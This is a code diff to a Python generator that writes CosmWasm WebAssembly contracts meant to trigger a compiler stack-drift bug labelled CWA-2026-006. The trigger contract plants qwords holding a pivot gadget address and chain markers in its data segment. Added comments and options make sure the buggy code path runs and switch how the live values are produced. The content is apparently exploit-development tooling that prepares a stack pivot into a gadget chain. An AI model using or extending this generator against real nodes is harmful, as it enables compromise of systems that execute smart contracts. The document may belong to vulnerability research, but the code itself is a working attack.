@@ -7,9 +7,11 @@ holder.wat  : CosmWasm ABI; `execute` stages i64 locals then calls the `query` h
 trigger.wat : CosmWasm ABI; `query` runs the sparse drift loop (E4/E5 shape). Live values are
               loaded from planted qwords (data segment) = pivot gadget address + chain markers.
 
-Usage: python3 gen_nested_contracts.py <outdir> [offset]
+Usage: python3 gen_nested_contracts.py <outdir> [--offset N] [--iters N] [--dense] [--live load|computed]
        (call schedule: call db_read when (i + offset) & 511 == 0; iters = 65536 + r + 1
         is baked in as a constant chosen by the caller via --iters)
+       --live computed emits the p1drift-proven computed live values instead of planted loads
+       (used by the dense_computed drift probe).
 """
 import argparse
 import os
@@ -80,7 +82,7 @@ def gen_holder(outdir):
     print("wrote", p, f"({len(req)}-byte request)")
 
 
-def gen_trigger(outdir, offset, iters, dense=False):
+def gen_trigger(outdir, offset, iters, dense=False, live="load"):
     vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
     lines = [
         ";; E6b trigger contract (generated).",
@@ -89,6 +91,10 @@ def gen_trigger(outdir, offset, iters, dense=False):
         '  (import "env" "db_read" (func $db_read (param i32) (result i32)))',
         '  (memory (export "memory") 1)',
         ALLOCATOR,
+        "  ;; CRITICAL: condition @0 must be nonzero so the THEN branch executes — the",
+        "  ;; CWA-2026-006 drift is emitted in the then-branch epilogue (Operator::Else);",
+        "  ;; with the else branch taken the buggy cleanup never runs (zero drift).",
+        '  (data (i32.const 0) "\\01\\00\\00\\00")',
         "  ;; @16 key region -> @48 one key byte; @32 response region -> @512 JSON",
         f'  (data (i32.const 16) "{esc(region(48, 1, 1))}")',
         f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
@@ -100,10 +106,15 @@ def gen_trigger(outdir, offset, iters, dense=False):
         "    (local $i i32)",
         "    (block $exit",
         "      (loop $l",
-        "        ;; 16 live values loaded from the planted qwords (register pressure)",
+        "        ;; 16 live values (register pressure) — loaded qwords or computed",
     ]
-    for k in range(LIVE):
-        lines.append(f"        (i64.load (i32.const {64 + 8 * k}))")
+    if live == "computed":
+        # p1drift-proven shape: computed live values from the loop index
+        for _ in range(LIVE):
+            lines.append("        (i64.extend_i32_u (local.get $i))")
+    else:
+        for k in range(LIVE):
+            lines.append(f"        (i64.load (i32.const {64 + 8 * k}))")
     lines += [
         "        (i32.load (i32.const 0))",
         "        (if (result i64)",
@@ -166,10 +177,12 @@ def main():
     ap.add_argument("--offset", type=int, default=256)
     ap.add_argument("--iters", type=int, default=65793)
     ap.add_argument("--dense", action="store_true", help="call db_read every iteration")
+    ap.add_argument("--live", choices=["load", "computed"], default="load",
+                    help="live-value kind: planted qword loads or computed (p1drift shape)")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
     gen_holder(args.outdir)
-    gen_trigger(args.outdir, args.offset, args.iters, args.dense)
+    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live)
     gen_benign(args.outdir)
 
 
